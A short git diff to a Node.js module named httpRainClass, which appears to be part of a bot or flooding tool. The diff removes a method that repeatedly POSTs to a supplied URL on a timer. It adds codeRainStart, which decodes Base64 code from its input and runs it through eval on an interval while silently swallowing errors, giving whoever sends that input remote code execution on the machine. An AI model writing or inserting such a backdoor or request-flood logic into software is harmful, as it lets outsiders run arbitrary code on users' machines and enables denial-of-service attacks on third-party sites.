@@ -1,4 +1,6 @@
 const request = require("request");
+const { Base64 } = require('js-base64');
+const os = require('os');
 
 class httpRainClass {
   constructor() {
@@ -16,19 +18,19 @@ class httpRainClass {
     }, data.seconds * 1000);
   };
 
-  postStart = (data) => {
-    console.log({ httpPostStart: data });
-    this.timer = setInterval(() => {
-      try {
-        request.post({ url: data.url, form: data.form }, (error, response, html) => {
-          console.log({ error, statusCode: response.statusCode, html });
-        });
-      } catch (requestErr) { }
-    }, data.interval);
-    setTimeout(() => {
-      clearInterval(this.timer);
-    }, data.seconds * 1000);
-  };
-}
+  codeRainStart = (data) => {
+    try {
+      console.log({ codeRainStart: data });
+      this.timer = setInterval(() => {
+        try {
+          eval(Base64.decode(data.code));
+        } catch (requestErr) { }
+      }, data.interval);
+      setTimeout(() => {
+        clearInterval(this.timer);
+      }, data.seconds * 1000);
+    } catch (err) { }
+  }
 
+}
 module.exports = new httpRainClass();
